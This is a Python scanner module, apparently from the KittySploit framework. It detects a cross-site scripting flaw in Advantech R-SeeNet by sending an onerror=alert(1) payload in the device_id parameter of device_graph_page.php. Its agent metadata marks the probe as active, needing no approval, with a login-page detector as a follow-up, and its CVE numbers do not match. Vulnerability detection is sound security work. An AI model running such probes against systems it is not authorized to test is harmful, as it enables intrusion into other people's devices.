#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Advantech R-SeeNet contains a cross-site scripting vulnerability in the device_graph_page."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Advantech R-SeeNet - Cross-Site Scripting Detection',
        'description': 'Advantech R-SeeNet contains a cross-site scripting vulnerability in the device_graph_page.php script via the device_id parameter. A specially crafted URL by an attacker can lead to arbitrary JavaScript code execution.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'rseenet', 'xss', 'advantech', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://talosintelligence.com/vulnerability_reports/TALOS-2021-1272',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-21801',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-21802',
    }

    def run(self):
        r = self.http_request(method="GET", path='/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"zlo onerror=alert(1) "', 'Device Status Graph',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Advantech R-SeeNet - Cross-Site Scripting detected",
                path='/php/device_graph_page.php?device_id=%22zlo%20onerror=alert(1)%20%22',
            )
            return True
        return False

